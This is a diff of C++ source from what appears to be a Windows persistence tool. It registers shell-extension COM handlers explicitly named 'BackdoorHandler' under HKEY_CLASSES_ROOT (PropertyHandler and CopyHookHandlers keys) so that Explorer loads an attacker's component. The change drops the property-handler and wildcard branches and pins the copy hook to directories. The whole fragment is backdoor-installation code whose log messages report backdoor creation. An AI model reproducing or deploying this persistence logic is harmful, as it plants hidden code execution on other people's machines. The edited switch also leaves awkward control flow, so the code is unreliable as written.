@@ -469,60 +469,9 @@ namespace reg {
 				break;
 			}
 			break;
-		case METADATA_HANDLER:
-			if (ext) {
-
-				strExt = std::wstring(ext);
-				progId = ResolveProgId(strExt.c_str());
-				progId.append(L"\\shellex\\PropertyHandler\\BackdoorHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
-
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
-
-						logging::log(LVL_INFO, L"Successfully Created Backdoor PropertyHandler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor PropertyHandler");
-
-					}
-					break;
-				}
-				break;
-
-			}
-			else {
-
-				logging::log(LVL_WARNING, L"No Extension Was Provided For PropertyHandler, Using Wildcard (*) PropertyHandler");
-				progId = std::wstring(L"*\\shellex\\PropertyHandler\\BackdoorHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
-
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
-
-						logging::log(LVL_INFO, L"Successfully Created Backdoor PropertyHandler");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor PropertyHandler");
-
-					}
-					break;
-				}
-				break;
-			}
-			break;
 		case COPY_HOOK_HANDLER:
-			if (ext) {
 
-				strExt = std::wstring(ext);
-				progId = ResolveProgId(strExt.c_str());
-				progId.append(L"\\shellex\\CopyHookHandlers\\BackdoorHandler");
+				progId = (L"Directory\\shellex\\CopyHookHandlers\\BackdoorHandler");
 				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
 				if (hkResult) {
 
@@ -539,32 +488,6 @@ namespace reg {
 					}
 					break;
 				}
-				break;
-
-			}
-			else {
-
-				logging::log(LVL_WARNING, L"No Extension Was Provided For CopyHookHandlers, Using Wildcard (*)");
-				progId = std::wstring(L"*\\shellex\\CopyHookHandlers\\BackdoorHandler");
-				hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
-				if (hkResult) {
-
-					status = AddDefaultValue(hkResult, Guid);
-					if (status == ERROR_SUCCESS) {
-
-						logging::log(LVL_INFO, L"Successfully Created Backdoor CopyHookHandlers");
-						break;
-					}
-					else {
-
-						logging::log(LVL_FATAL, L"Unable to Set Backdoor CopyHookHandlers");
-
-					}
-					break;
-				}
-				break;
-			}
-			break;
 
 			return (status == ERROR_SUCCESS) ? TRUE : FALSE;
 
